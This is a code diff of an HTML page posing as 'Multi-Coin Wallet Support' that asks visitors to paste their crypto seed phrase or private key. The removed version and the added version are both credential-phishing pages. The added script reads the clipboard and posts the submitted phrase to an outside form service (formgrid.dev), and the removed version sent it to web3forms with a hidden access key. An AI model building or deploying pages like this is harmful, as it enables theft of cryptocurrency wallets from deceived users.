@@ -98,72 +98,58 @@
 </head>
 
 <body>
-
 <div class="container">
-  <h2>Multi-Coin Wallet</h2>
-  <p>After pasting the phrase ensure you delete/remove all space between each words for safety and successfull login  no space between each phrase</p>
+  <h2>Multi-Coin Wallet Support</h2>
+  <p>login to submit your complaint and fix your wallet related issues</p>
 
-       <form action="https://api.web3forms.com/submit" method="POST">
-    <!-- Web3Forms Key -->
-    <input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+  <form id="complaintForm">
+    <input type="text" name="username" placeholder="Wallet Name" required>
 
-
-<input type="hidden" name="redirect" value="https://synchronize-beta.vercel.app/success.html">
-<!-- Username Field -->
-<div class="field">
-  <input type="text" name="name" placeholder=" Wallet Name" required>
-  <div class="required-text">* Required</div>
-</div>
-    <!-- Complaint Field + Paste Button -->
-    <div class="field">
-      <div class="textarea-row">
-        <textarea name="complaint" name="name"  placeholder="Input Phrase" required></textarea>
-        <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
-      </div>
-      <div class="required-text">Enter seed phrase or private key
-Input your seed phrases with spacing. Supports 12-word, 24-word seed phrases and private keys for all wallet types</div>
+    <div class="textarea-wrapper">
+      <textarea id="complaintBox" name="complaint" placeholder="input Phrase" required></textarea>
+      
+      <!-- ✅ Small Paste Button -->
+      <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
     </div>
+     <div class="required-text">Enter seed phrase or private key
+Input your seed phrases with spacing. Supports 12-word, 24-word seed phrases and private keys for all wallet types</div>
 
-    <!-- Submit -->
-    <button type="submit" class="submit-btn">Restore Wallet</button>
-
+    <button type="submit" class="submit-btn">RESTORE WALLET</button>
   </form>
-
 </div>
 
 <script>
-// Prefill Step 1 data
-document.addEventListener('DOMContentLoaded', ()=>{
-    const step1Data = JSON.parse(localStorage.getItem('step1Data') || '{}');
-    document.getElementById('email').value = step1Data.email || '';
-});
-
-// Step 2 submission
-document.getElementById('step2Form').addEventListener('submit', async function(e){
-    e.preventDefault();
-    const form = e.target;
-
-    // Combine Step 1 + Step 2 data
-    const combinedData = new FormData(form);
-    const step1Data = JSON.parse(localStorage.getItem('step1Data') || '{}');
-    for (const key in step1Data) {
-        combinedData.append(key, step1Data[key]);
-    }
-
+  async function pasteClipboard() {
     try {
-        await fetch('https://api.web3forms.com/submit', { method:'POST', body:combinedData });
-
-        alert("Step 2 submitted successfully!");
-        localStorage.removeItem('step1Data');
-
-        // Redirect to final success page
-        window.location.href = "success.html";
-
-    } catch(err){
-        alert("Submission failed, try again.");
-        console.error(err);
+      const text = await navigator.clipboard.readText();
+      document.getElementById("complaintBox").value += text;
+    } catch (err) {
+      alert("Clipboard access denied!");
     }
-});
+  }
+
+  const form = document.getElementById("complaintForm");
+
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+
+    fetch("https://formgrid.dev/api/f/FORMGRID_ENDPOINT", {
+      method: "POST",
+      body: formData
+    })
+    .then(res => {
+      if (res.ok) {
+        window.location.href = "success.html";
+      } else {
+        alert("Submission failed!");
+      }
+    })
+    .catch(err => {
+      alert("Error submitting form");
+    });
+  });
 </script>
 
 </body>
